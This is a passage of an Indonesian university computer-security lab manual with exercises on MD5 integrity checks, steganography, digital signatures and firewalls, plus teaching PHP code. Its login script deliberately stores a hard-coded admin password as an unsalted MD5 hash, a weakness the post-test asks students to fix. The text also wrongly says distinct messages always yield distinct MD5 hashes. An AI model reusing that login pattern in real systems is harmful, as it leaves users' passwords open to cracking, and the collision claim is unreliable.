MD5 didesain oleh Ronald Rivest pada tahun 1991 untuk menggantikan hash function sebelumnya, yaitu MD4 yang berhasil diserang oleh kriptanalis. Perlu ditegaskan bahwa Algoritma  MD5 dengan ukuran input berapapun akan menghasilkan pesan ringkas yang panjangnya sama/ tetap

---

<!-- Halaman 43 -->

yang dinyatakan dalam kode heksadesimal yang panjangnya 128 bit, perlu diingat bahwa satu karakter heksadesimal = 4 bit, berarti panjang outputnya 32 karakter heksa.

Terkadang kita menginginkan isi arsip tetap terjaga keasliannya, bila terjadi perubahan kecil pada arsip tersebut maka akan mengalami kesulitan dalam mendeteksinya jikalau ia berukuran besar. Fungsi hash dapat digunkan untuk menjaga keutuhan data, caranya bangkitkan message digest dari isi arsip dengan menggunakan algoritma MD5 dan datanya bisa disimpan dalam basis data, kemudian verifikasi isi arsip dapat dilakukan secara berkala dengan membandingkan message digest.

Jika terjadi perbedaan antara isi arsip sekarang dengan message digest dari arsi asli maka disimpulkan ada modifikasi terhadap isi arsip. Aplikasi ini didasarkan pada kenyataan bahwa perubahan 1 bit pada pesan akan mengubah secara rata- rata setengah dari bit-bit message digest, dengan kata lain fungsi hash sangat peka terhadap perubahan sekecil apa pun pada data masukan.

Contoh : file txt yang berisi teks berikut Aplikasi dari fungsi hash antara lain untuk memverifikasi kesamaan Salinan suatu arsip dengan arsip aslinya yang tersimpan di dalam sebuah basisdata terpusat, kemudian apa pengertian dari Fungsi Hash Satu Arah(one-way Hash) yaitu fungsi hash yang bekerja dalam stu arah, dan pesan yang sudah diubah menjadi message digest tidak dapat dikembalikan lagi menjadi pesan semula, bila dua pesan yang berbeda akan selalu menghasilkan nilai Hash yang berbeda pula.

Memiliki hash MD5 : 4B97E98235F061A3923C4B005E9704A9 Jika huruf “A” pada awal kalimat aplikasi diganti dengan huruf “a” sehingga menjadi “aplikasi” ternyata nilai hash MD5-nya berubah sangat signifikan yaitu : 44333411A4F8A0FDB901F1596D743668. Salah satu soft ware yang digunakan untuk melakukan validasi MD5 adalah MD5 Check Utility. Berikut tampilan dari MD5 ceksum. Pada software ini kita dapat mengetahui nilai md5 dari file yang di miliki. Format file seperti .pdf, .doc, .ppt, dan lain-lain. Kemudian kita juga bisa melakukan validasi nilai md5 apakah terdapat perubahan pada isi file yang kita miliki.  Berikut contoh penggunaan dan autentikasi dari softwate md5 check utility.

### A. PENGGUNAAN TOOL

1. Dst Pastikan anda telah mengcopy file MD5.rar dengan nilai hash MD5 : 8C91103D9D8ED8B6EB70BE693C574952 , dalam file tersebut terdapat 2 file MD5.exe dan MD5 Readme.txt 2. Esktrak file tersebut dan jalankan file MD5 (untuk menjalankan aplikasi ini tidak perlu diinstal),

### sehingga akan menampilkan use interface seperti berikut :

Gambar 4. 1 UI MD5 Utility

---

<!-- Halaman 44 -->

Catatan: nilai pada textbox yang atas (sebelah paste) sesuai isi clipboard, kalau clipboard kosong textbox tersebut juga kosong.

### B. AUTENTIKASI FILE

1. Bukalah sembarangan file yang ada di computer anda namun dengan syarat file yang digunakan mudah untuk dilakukan pengeditan, missal MS Word, atau teks. (Hal ini digunakan untuk mempermudah penjelasan dan keterkaitan pemberian contoh selanjutnya). Perlu diingat nama file dan lokasi penyimpanan serta ukuran dari file tersebut. 2. Hitunglah nilai hash-nya dengan aplikasi di atas, dengan cara :

- Pilih create an MD5 Checksum - Pilih file yang sudah dibuat - Lalu pilih OK - Akan muncul nilai hash, silahkan di copy-paste pada notepad 3. Buatlah sedikit perubahan pada file tersebut walaupun hanya 1 bit atau 1 byte, misalnya huruf

“a” diganti huruf “B”, lali simpan file tersebut. 4. Verifikasilah nilai hash tersebut dengan nilai asli (cek langkah 2) dengan cara :

- Copy nilai hash yang ada pada notepad (hasil Langkah 2) - Pilih verify an MD5 Checksum pada aplikasi MD5 - Pilih paste - Pilih Browse dan pilih hasil file yang sudah di edit (Langkah no 3) 5. Untuk membuktikan dan memastikan, lakukan autentikasi (langkah 1-4) untuk format file lain

### dengan ukuran yang lebih besar.

4.4     HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. XAMPP 3. Notepad/text editor 4.5     PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2 | Jelaskan Perbedaan Kriptografi Klasik dan Modern | 30 |
| 2. |  |  | Sebutkan dan jelaskan jenis jenis algoritma yang termasuk dalam kriptografi Modern | 30 |
| 3. |  |  | Jelaskan perbandingan (Kelebihan dan Kekurangan) antara algoritma enkripsi MD5 dan SHA1 | 40 |

4.6     LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2 | Selesaikan langkah praktikum yang terdapat dibawah. | Hasil praktikum langkah A-D | 100 |

---

<!-- Halaman 45 -->

### Langkah-Langkah Praktikum:

2. Buatlah pada Folder baru (htdocs/keamanankomputer_3digitNIM/Pertemua4). 3. Copy semua file yang ada di Pertemuan3. Terdapat 5 file 4. Ubah code dashboard.php

```
<?php 
session_start(); 
if (!isset($_SESSION['username'])) { 
    header("Location: index.php"); 
    exit(); 
} 
 
$input_teks = ""; 
$hasil_md5 = ""; 
$verifikasi_teks = ""; 
$verifikasi_hash = ""; 
$status_verifikasi = ""; 
 
// Proses Generate MD5 
if (isset($_POST['generate'])) { 
    $input_teks = $_POST['input_teks']; 
    $hasil_md5 = md5($input_teks); // Fungsi bawaan PHP untuk MD5 
} 
 
// Proses Verifikasi Integritas 
if (isset($_POST['verify'])) { 
    $verifikasi_teks = $_POST['verifikasi_teks']; 
    $verifikasi_hash = trim($_POST['verifikasi_hash']); 
     
    $calculated_hash = md5($verifikasi_teks); 
     
    if 
(strtolower($calculated_hash) 
=== 
strtolower($verifikasi_hash)) { 
        $status_verifikasi 
= 
"<div 
class='alert-
success'><b>MATCH!</b> Integritas file/teks terjaga. Tidak ada 
perubahan.</div>"; 
    } else { 
        $status_verifikasi 
= 
"<div 
class='alert-
danger'><b>MISMATCH!</b> Peringatan: Teks telah dimodifikasi. Hash 
berbeda!</div>"; 
    } 
} 
?> 
<!DOCTYPE html> 
<html lang="id"> 
<head> 
    <meta charset="UTF-8"> 
    <title>Dashboard - MD5 Check Utility</title> 
    <style> 
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, 
sans-serif; background: #f4f6f9; margin: 0; padding: 20px; } 
        .container { max-width: 800px; margin: 0 auto; background: 
white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px 
rgba(0,0,0,0.1); } 
```

---

<!-- Halaman 46 -->

```
        .header { display: flex; justify-content: space-between; 
align-items: center; border-bottom: 2px solid #eee; padding-
bottom: 10px; margin-bottom: 20px; } 
        .btn-logout { background: #dc3545; color: white; padding: 
8px 16px; text-decoration: none; border-radius: 4px; font-weight: 
bold; } 
        .card-section { background: #f8f9fa; border: 1px solid 
#dee2e6; padding: 20px; border-radius: 5px; margin-bottom: 20px; } 
        input[type="text"], textarea { width: 100%; padding: 10px; 
margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-
sizing: border-box; } 
        .btn-primary { background: #0d6efd; color: white; border: 
none; padding: 10px 20px; border-radius: 4px; cursor: pointer; 
font-weight: bold; } 
        .hash-result { font-family: monospace; font-size: 18px; 
color: #198754; background: #e8f5e9; padding: 10px; border-radius: 
4px; word-break: break-all; } 
        .alert-success 
{ 
color: 
#0f5132; 
background-color: 
#d1e7dd; padding: 15px; border-radius: 4px; margin-top: 15px; } 
        .alert-danger { color: #842029; background-color: #f8d7da; 
padding: 15px; border-radius: 4px; margin-top: 15px; } 
    </style> 
</head> 
<body> 
 
<div class="container"> 
    <div class="header"> 
        <h2>MD5 Check Utility - Web Version</h2> 
        <a href="logout.php" class="btn-logout">Logout</a> 
    </div> 
 
    <!-- Fitur 1: Generate MD5 --> 
    <div class="card-section"> 
        <h3>1. Buat MD5 Checksum</h3> 
        <p><small>Masukkan 
teks 
(misal: 
"Aplikasi" 
atau 
"aplikasi") 
untuk 
melihat 
perbedaan 
hash 
yang 
dihasilkan.</small></p> 
        <form method="POST"> 
            <textarea 
name="input_teks" 
rows="3" 
required 
placeholder="Masukkan 
teks 
asli 
di 
sini..."><?= 
htmlspecialchars($input_teks) ?></textarea> 
            <button 
type="submit" 
name="generate" 
class="btn-
primary">Generate Hash MD5</button> 
        </form> 
         
        <?php if ($hasil_md5): ?> 
            <div style="margin-top: 15px;"> 
                <strong>Hasil Hash (32 Karakter Hex):</strong> 
                <div class="hash-result"><?= $hasil_md5 ?></div> 
            </div> 
        <?php endif; ?> 
    </div> 
 
    <!-- Fitur 2: Verifikasi MD5 --> 
    <div class="card-section"> 
        <h3>2. Verifikasi Integritas Data (Authentication)</h3> 
```

---

<!-- Halaman 47 -->

```
        <p><small>Uji perubahan 1 bit. Masukkan teks yang sudah 
diubah sedikit, lalu cocokkan dengan Hash MD5 aslinya.</small></p> 
        <form method="POST"> 
            <label>Teks Arsip Saat Ini:</label> 
            <textarea name="verifikasi_teks" rows="2" required 
placeholder="Masukkan 
teks 
untuk 
diuji..."><?= 
htmlspecialchars($verifikasi_teks) ?></textarea> 
             
            <label>Paste MD5 Checksum Asli:</label> 
            <input type="text" name="verifikasi_hash" required 
value="<?= 
htmlspecialchars($verifikasi_hash) 
?>" 
placeholder="Contoh: 4B97E98235F061A3923C4B005E9704A9"> 
             
            <button 
type="submit" 
name="verify" 
class="btn-
primary">Verifikasi Sekarang</button> 
        </form> 
 
        <?= $status_verifikasi ?> 
    </div> 
</div> 
 
</body> 
</html> 
 
```

5. Ubah auth2.php

```
<?php 
session_start(); 
 
// Simulasi Database: Password "admin123" telah di-hash 
menggunakan MD5 
// Hasil MD5 dari "admin123" adalah 
"0192023a7bbd73250516f069df18b500" 
$database_user = [ 
    'username' => 'admin', 
    'password' => '0192023a7bbd73250516f069df18b500',  
    'role'     => 'Administrator' 
]; 
 
if (isset($_POST['login'])) { 
    $username = trim($_POST['username']); 
    $password_input = trim($_POST['password']); 
 
    // Mengubah input password menjadi hash MD5 
    $password_md5 = md5($password_input); 
 
    // Validasi pencocokan username dan hash MD5 
    if ($username === $database_user['username'] && $password_md5 
=== $database_user['password']) { 
        $_SESSION['username'] = $database_user['username']; 
        $_SESSION['role']     = $database_user['role']; 
         
        header("Location: dashboard.php"); 
        exit(); 
    } else { 
```

---

<!-- Halaman 48 -->

```
        $_SESSION['error'] = "Username atau Password salah!"; 
        header("Location: index.php"); 
        exit(); 
    } 
} else { 
    header("Location: index.php"); 
    exit(); 
} 
?> 
Figure 7 
```

4.7     POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

### Clue:

Rainbow table attack (serangan tabel pelangi) adalah teknik peretasan kata sandi yang menggunakan tabel berisi nilai hash yang telah dihitung sebelumnya untuk menemukan kata sandi asli dari teks tersandi (hash).

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2 | Pada file simulasi MD5 Check Utility, terdapat baris kode untuk memverifikasi kecocokan checksum yang diinput pengguna dengan hasil kalkulasi sistem: Analisislah apa yang akan terjadi pada sistem jika Anda tidak menggunakan fungsi tersebut dan langsung membandingkannya dengan operator identik (===)! | 50 |
| 2. | CPL 09KK02 | CPMK 5.1.2 | Pada file auth.php yang Anda praktikkan, proses enkripsi password menggunakan perintah mentah: Penggunaan MD5 murni seperti di atas saat ini dikategorikan rentan terhadap peretasan menggunakan Rainbow Table (database kamus MD5). Pertanyaan: Modifikasilah baris kode tersebut dengan mengimplementasikan teknik Salting (gabungkan input password dengan string statis acak, misalnya "KunciRahasia") sebelum di-hash. Jelaskan secara logis bagaimana tambahan kode sederhana ini menggagalkan serangan Rainbow Table! | 50 |

4.8     HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

---

<!-- Halaman 49 -->

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 09KK02 | CPMK 5.1.2 | 20% | 100 | 20 |
| 2. | Praktik | CPL 09KK02 | CPMK 5.1.2 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 09KK02 | CPMK 5.1.2 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 50 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 52 -->

## PRAKTIKUM 5:      INFORMATION HIDING

Pertemuan ke : 5 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 09KK02 | Kemampuan merancang dan menganalisis algoritma untuk menyelesaikan permasalahan organisasi secara optimal, serta memilih dan menerapkannya pada bahasa pemrograman tertentu. |
| --- | --- |
| CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |

5.1     DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami konsep, prinsip information hiding, teknik steganografi dan watermarking untuk proteksi hak cipta. 2. Menerapkan konsep information hiding, teknik steganografi dan watermarking untuk proteksi hak cipta. 5.2     INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 09-KK02 | CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |
| --- | --- | --- |

Information hiding atau steganografi adalah teknik yang digunakan untuk menyembunyikan informasi di dalam media lainnya (seperti gambar, audio, video, atau teks) sehingga pihak ketiga tidak dapat mendeteksi keberadaan pesan atau informasi tersebut. Tujuan utamanya adalah mengamankan komunikasi dengan menyamarkan keberadaan pesan, berbeda dengan kriptografi yang

---

<!-- Halaman 53 -->

menyembunyikan isi pesan tetapi tidak menyembunyikan keberadaannya. Steganografi memiliki berbagai aplikasi dalam dunia nyata, seperti:

• Komunikasi rahasia: Digunakan oleh pihak-pihak yang ingin menyembunyikan komunikasi mereka dari pihak ketiga (misalnya, dalam diplomasi atau militer). • Watermarking digital: Menyembunyikan tanda kepemilikan (hak cipta) dalam file digital seperti gambar, audio, atau video, tanpa mengganggu kualitas file tersebut. • Perlindungan informasi pribadi: Untuk menyembunyikan data sensitif di dalam file lain sehingga tidak mudah diakses oleh pihak yang tidak berwenang. Steganography berbeda dengan cryptography, letak perbedaan adalah komponen input dan hasil keluarannya. Proses steganography membutuhkan minimal 2 komponen input/objek yaitu file host (stego medium) yang akan dijadikan sebagai induk penyembunyian dan informasi digital yang akan di sembunyikan. Hasil dari cryptography biasanya berupa data yang berbeda dari bentuk aslinya dan biasanya data seolah-olah berantakan (namun dapat dikembalikan ke data semula), sedangkan hasil keluaran dari steganography secara visual (indrawi) memiliki bentuk yang sama dengan data aslinya, tentu saja persepsi ini oleh indra manusia, tetapi tidak oleh computer atau pengolah data digital lainnya. Selain itu pada steganography keberadaan informasi disembunyikan/tidak diketahui dan terjadi penyampulan tulisan (covered writing). Sedangkan pada cryptography informasi dikodekan dengan enkripsi atau metode pengkodean dan informasi diketahui keberadaannya tetapi tidak dimengerti maksudnya. Istilah dalam information hiding dapat dijelaskan sebagai berikut:

File host : file objek yang akan disisipi data digital lain File informasi : file yang akan disisipkan dalam data digital lain File stego medium : file induk yang sudah disisipi file informasi 5.4     HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Command Prompt 3. Notepad 5.5     PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2 | Jelaskan Apa itu Information Hidding dan Steganografi! | 30 |
| 2. |  |  | Jelaskan Perbedaan Steganografi dan Kriptography! | 20 |
| 3. |  |  | Jabarkan Konsep dari Stegabografi disertai ilustrasi gambar! | 40 |

5.6     LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2 | Selesaikan langkah praktikum 1-4 | Hasil praktikum langkah 1 – 4 | 100 |

---

<!-- Halaman 54 -->

### Langkah-Langkah Praktikum:

### 1. Penggunaan tool

a. Pastikan anda sudah mengcopy file software S-Tool4. Jalankan program tersebut (tanpa harus diinstall) 2. Penyembunyian data a. Tentukan file host/induk (yang akan disisipi) kemudian drag and drop pada window tersebut b. Tentukan file informasi yg akan disembunyikan, drag and drop pd file host yg telah ada pada window Stool masukan password sesuai dgn selera 3. Sehingga terbentuk stego medium yang telah disisipi file informasi dengan nama window hiden data, simpanlah file tersebut. Lakukan analisa atas file stego medium dan host yang belum ditempeli.

a. Lakukan revealing dengan click kanan. Betulkah data yang termuat (hasil revealing) b. Lakukan modifikasi terhadap file stego medium 4. Lakukan Langkah b-c tersebut dengan menggunakan minimal 2 jenis data host yang berbeda,

### misal :

a. Gambar b. Audio c. Dokumen

### 5.7     POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL-07 | CPMK-03 | Lakukan kembali proses Menyisipkan informasi berupa: a. Nama Lengkap b. NIM c. Kelas d. Hoby e. Ceritakan Sedikit tentang apa yang akan anda lakukan setelah lulus dari TIF UAD. Semua informasi diatas disimpan dalam file gambar foto terbaik diri anda, laporan berupa langkah dan hasil dari proses penyisipan informasi | 100 |

5.8     HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 09-KK02 | CPMK 5.1.2 | 20% | 100 | 20 |
| 2. | Praktik | CPL 09-KK02 | CPMK 5.1.2 | 30% | 100 | 30 |
| 3. | Post-Test | CPL 09-KK02 | CPMK 5.1.2 | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

---

<!-- Halaman 56 -->

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 57 -->

## PRAKTIKUM 6:      DIGITAL SIGNATURE

Pertemuan ke : 6 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 09-KK02 | Kemampuan merancang dan menganalisis algoritma untuk menyelesaikan permasalahan organisasi secara optimal, serta memilih dan menerapkannya pada bahasa pemrograman tertentu. |
| --- | --- |
| CPMK 5.1.2 | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |

6.1     DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu:

1. Mampuan merancang dan menganalisis algoritma untuk menyelesaikan permasalahan organisasi secara optimal, serta memilih dan menerapkannya pada bahasa pemrograman tertentu. 2. Mengimplementasikan konsep digital signature untuk meningkatkan kemanan dengan bahasa pemrograman tertentu 6.2     INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 09-KK02 | CPMK 5.1.2. | Mengimplementasikan konsep kriptografi, steganografi, digital signature dan manajemen key untuk meningkatkan kemanan dengan bahasa pemrograman tertentu |
| --- | --- | --- |

6.3     TEORI PENDUKUNG

Tanda tangan digital digital merupakan salah satu cara untuk memberikan authentication, integrity, dan non-repudiation pada dokumen digital yang akan dikirimkan/didistribusikan. Prinsip yang digunakan dalam tanda tangan digital adalah data yang dikirimkan harus ditanda tangani oleh pengirim dan tanda tangan bisa diperiksa oleh penerima untuk memastikan keaslian data yang dikirimkan. Proses ini menganalogikan proses penandatanganan dokumen kertas oleh yang berwenang sebelum

---

<!-- Halaman 58 -->

dikirimkan. Dengan cara ini pengirim bertanggung jawab terhadap isi dokumen dan dapat dicek keaslian dokumen oleh penerima. Menurut Arrianto Mukti Wibowo [1] sifat dimiliki oleh tanda tangan digital adalah: 1. Otentik, tak bisa/sulit ditulis/ditiru oleh orang lain. Pesan dan tanda tangan pesan tersebut juga dapat menjadi barang bukti, sehingga penandatangan tak bisa menyangkal bahwa dulu ia tidak pernah menandatanganinya. 2. Hanya sah untuk dokumen (pesan) itu saja ayau kopinya yang sama persis. Tanda tangan itu tidak bisa dipindahkan ke dokumen lainnya, meskipun dokumen lain itu hanya berbeda sedikit. Ini juga berate bahwa jika dokumen itu diubah, maka tanda tangan digital dari pesan tersebut tidak lagi sah. 3. Dapat diperiksa dengan mudah, termasuk oleh pihak-pihak yang belum pernah bertatap muka langsung dengan penandatangan.

Menurut Arrianto Mukti Wibowo, dkk [3], penggunaan digital signature berawal dari penggunaan teknik kriptografi yang digunakan untuk mengamankan informasi yang hendak ditransmisikan/disampaikan kepada orang yang lain yang sudah digunakan sejak ratusan tahun yang lalu. Dalam suatu kriptografi suatu pesan dienkripsi (encrypt) dengan menggunakan suatu kunci (key). Hasil dari enkripsi ini adalah berupa chipertext tersebut kemudian dikirimkan kepada tujuan yang dikehendakinya. Chipertext tersebut kemudian didekripsi (decrypt) dengan suatu kunci untuk mendapatkan informasi yang telah enkripsi tersebut. Terdapat dua macam cara dalam melakukan enkripsi yaitu dengan menggunakan kriptografi simetris (symetric crypthography/secret key crypthography) dan kriptografi simetris (asymetric crypthography) yang kemudian lebih dikenal sebagai public key crypthography. Teknologi tanda tangan digital memanfaatkan teknologi kunci publik. Sepasang kunci publik-privat dibuat untuk keperluan seseorang. Kunci privat disimpan oleh pemiliknya, dan dipergunakan untuk membuat tanda tangan digital. Sedangkan kunci publik dapat diserahkan kepada siapa saja yang ingin memeriksa tanda tangan digital yang bersangkutan pada suatu dokumen. Proses pembuatan dan pemeriksaan tanda tangan ini melibatkan sejumlah teknik kriptografi yaitu fungsi hash dan sistem kripto kunci public. 6.4     HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Microsoft Word 3. Paint 6.5     PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2. | Jelaskan dengan bahasamu apa itu Digital Signature | 30 |
| 2. |  |  | Bagaimana Cara mekanisme kerja dari Digital Signature sertai dengan illustrasi | 40 |
| 3. |  |  | Berdasarkan sertifikasi kelas Digital Signature, Sebutkan dan jelaskan kelas kelas tersebut | 30 |

---

<!-- Halaman 59 -->

6.6     LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2. | Selesaikan langkah praktikum 1 – 5 | Hasil praktikum langkah 1 – 5 | 100 |

### Langkah-Langkah Praktikum:

Digital signature dengan Microsoft Word 1. Jalankan Ms Word terlebih dahulu. 2. Dalam text editor tersebut buatlah suatu naskah yang nantinya merupakan dokumen pribadi anda. 3. Membuat tanda tangan digital:

a. Pada tampilan menu utama pilih Signature → create key , maka akan muncul jendela baru untuk membuat kunci enkripsi dan kunci dekripsi. Yang perlu diisi cukup nama dan email saja, kemudian Generate key dan kemudian save key. b. Setelah disimpan, maka tanda tangan tersebut dapat digunakan kapan saja pada aplikasi Ms

Word. File dengan ekstensi .dse merupakan file yang digunakan untuk menyimpan kunci public yang akan digunakan untuk memberikan tanda tangan digital pada dokumen. c. File/ kunci tersebut dapat diketahui oleh siapa saja. File dengan ekstensi .dsd merupakan file yang digunakan untuk menyimpan kunci private yang akan digunakan untuk memvalidasi dokumen. File ini hanya boleh diketahui/dimiliki oleh pemilik tanda tangan. 4. Memberikan tanda tangan digital pada dokumen/menandatangani dokumen secara digital. Setelah kita memiliki tanda tangan digital yg terseimpan dalam file dengan eksteni .dse dan .dsd maka kita tinggal membubuhkan tanda tangan tersebut pada dokumen, dengan memilih menu Signature Validate signature. Teks box tidak perlu diisi, cukup buka file kunci private (.dsd) dengan button browse key. 5. Simpan dokumen tersebut, sehingga document tersebut berarti sudah merupakan dokumen yang memuat tanda tangan digital kita. Digital signature pas Ms Word dalam Microsoft Office (word, excel, power point, ouytlook) juga tersedia digital signature, namun penyimpanan kunci/tamda tangannya secara online dan berbayar. Anda bisa memilih prepare pada office button (sudut kiri atas), maka ada beberapa menu pengamanan dokumen dan salah satunya digital signature. 6.7     POST TEST

### Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 09KK02 | CPMK 5.1.2. | Buatlah Sebuah Surat perjanjian dengan topik bebas (Semenarik mungkin) kemudian sertakan minimal 4 pihak yang terlibat dengan masing masing pihak memiliki tanda tangan digital | 50 |
| 2. | CPL 09KK02 | CPMK 5.1.2. | Analisislah apakah tanda tangan digital sangat diperlukan pada zaman sekarang ini?, keluarkan semua opini kalian (opini yang logis akan mendapatkan nilai yang logis juga) | 50 |

---

<!-- Halaman 60 -->

6.8     HASIL CAPAIAN PRAKTIKUM

Diisi oleh asisten setelah semua assessment dinilai.

| No | Bentuk Assessment | CPL | CPMK | Bobot | Skor (0-100) | Nilai Akhir (Bobot x Skor) |
| --- | --- | --- | --- | --- | --- | --- |
| 1. | Pre-Test | CPL 09KK02 | CPMK 5.1.2. | 20% | 100 | 20 |
| 2. | Praktik | CPL 09KK02 | CPMK 5.1.2. | 30% | 100 | 30 |
| 3. | Post-Test | CPL 09KK02 | CPMK 5.1.2. | 50% | 100 | 50 |
| Total Nilai |  |  |  |  |  | 100 |

### LEMBAR JAWABAN PRE-TEST DAN POST-TEST PRAKTIKUM

| Nama : NIM : | Asisten: Paraf Asisten: | Tanggal: Nilai: |
| --- | --- | --- |

---

<!-- Halaman 62 -->

## PRAKTIKUM 7:      FIREWALL

Pertemuan ke : 7 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 03-KU1 | Mampu menerapkan pemikiran logis, kritis, sistematis, dan inovatif dalam konteks pengembangan atau implementasi ilmu pengetahuan dan teknologi yang memperhatikan dan menerapkan nilai humaniora yang sesuai dengan bidang rekayasa perangkat lunak serta data dan sistem cerdas maupun bidang lainnya. |
| --- | --- |
| CPMK 5.1.3 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |

7.1.      DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami dan menerapkan penggunaan firewall untuk pengaturan kebijakan akses untuk filtering instruksi. 7.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 03-KU1 | CPMK 5.1.3 | Mendemokan cara mengamankan internet, jaringan wireless, dan basis data |
| --- | --- | --- |

Firewall adalah system atau sekelompok system yang menetapkan kebijakan kendali akses antara dua jaringan. Secara prinsip, firewall dapat dianggap sebagai sepasang mekanisme : yang pertama memblok lalu lintas, yang kedua mengijinkan lalu lintas jaringan. Firewall dapat digunakan untuk melindungi jaringan anda dari serangan jaringan oleh pihak luar, namun firewall tidak dapat melindungi dari serangan yang tidak melalui firewall dan serangan dari seseorang yang berada di dalam jaringan anda, serta firewall tidak dapat melindungi anda dari program-program aplikasi yang ditulis dengan buruk.

---

<!-- Halaman 63 -->

Secara umum, firewall biasanya menjalankan fungsi : • Analisa dan filter paket Data yang dikomunikasikan lewat protocol di internet, dibagi atas paket-paket. Firewall dapat menganalisa paket ini, kemudian memperlakukan sesuai kondisi tertentu. Misal, jika ada paket a makan akan dilakukan b. Untuk filter paket, dapat dilakukan di Linux tanpa program tambahan. • Blocking isi dan protocol Firewall dapat melakukan blocking terhadap isi paket, misalnya berisi applet jave, ActiveX, VBScript, Cookie. • Autentikasi koneksi dan enkripsi Firewall umumnya memiliki kemampian untuk menjalankan enkripsi dalam autentikasi identitas user, integritas dari satu session, dan melapisi transfer data dari intipan pihak lain. Enkripsi yang dimaksud termasuk DES, Triple DES, SSL, IPSEC, SHA, MD5, BlowFish, IDEA, dsb Secara konseptual, terdapat dua macam firewall yaitu • Network level Firewall network level mendasarkan keputusan mereka pada alamat sumber, alamat tujuan dan port yang terdapat dalam setiap paket IP. Network level firewall sangat cepat dan sangat transparan bagi pemakai. Application level firewall biasanya adalah host yang berjalan sebagai proxy server, yang tidak mengijinkan lalu lintas antar jaringan, dan melakukan logging dan auditing lalu lintas yang melaluinya. • Application level Application level firewall 